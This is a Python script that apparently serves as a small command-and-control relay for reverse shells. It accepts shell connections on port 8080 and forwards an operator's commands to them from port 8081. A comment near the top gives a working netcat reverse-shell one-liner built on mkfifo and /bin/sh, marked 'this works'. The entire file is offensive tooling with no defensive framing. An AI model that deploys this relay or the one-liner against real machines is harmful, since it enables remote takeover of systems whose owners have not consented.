import socket
import threading

# this works rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f

sessions = {"work": None}
server_sockets = []

def handle_client(client_socket):
    # Print "HOORAY" when a session is established
    print("HOORAY")
    #client_socket.send(b"biba\n")
    sessions['work'] = client_socket
    # You can add more code here to handle client communication
    # client_socket.close()

def work_with_customer(main_socket):
    print("HI")
    
    main_socket.send(b"Select 0 to work\n")
    com = main_socket.recv(1024).decode().strip()
    print(com.encode(), com)
    main_socket.send(b"Working with\n")
    if com == "0" and sessions["work"] is not None:
        client_socket = sessions["work"]
        pwd = client_socket.recv(1024).decode()
        #main_socket.send(f"{pwd}".encode())
        
        while True:
            #main_socket.send(b">> ")
            command = main_socket.recv(1024).decode().strip()
            if command == "exit":
                break
            elif command.startswith("cd "):
                client_socket.send((command + "\n").encode())                
            else:
                client_socket.send((command + "\n").encode())
                print(f"Waiting answer for'{command}'")
                ans = client_socket.recv(4096).decode()
                print("Answer from client", ans)
                main_socket.send(ans.encode())
                main_socket.send(client_socket.recv(1024))
            
    elif com == "exit":
        main_socket.close()
    else:
        print(sessions)
        main_socket.send(b"dead beef\n")

def accept_clients(port, handler):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", port))
    server_socket.listen()
    server_sockets.append(server_socket)  # Keep track of the server socket
    print(f"Server is listening on port {port}...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Accepted connection from {addr} on port {port}")
        # Start a new thread to handle the client
        client_handler = threading.Thread(target=handler, args=(client_socket,))
        client_handler.start()

def main():
    try:
        # Start a thread for each port
        thread_8080 = threading.Thread(target=accept_clients, args=(8080, handle_client))
        thread_8081 = threading.Thread(target=accept_clients, args=(8081, work_with_customer))

        thread_8080.start()
        thread_8081.start()

        thread_8080.join()
        thread_8081.join()
    except KeyboardInterrupt:
        print("Closing")
        for sock in server_sockets:
            try:
                sock.close()
                print(f"Closed server socket on port {sock.getsockname()[1]}")
            except OSError:
                print(f"Already closed {sock.getsockname()[1]}")

if __name__ == "__main__":
    main()

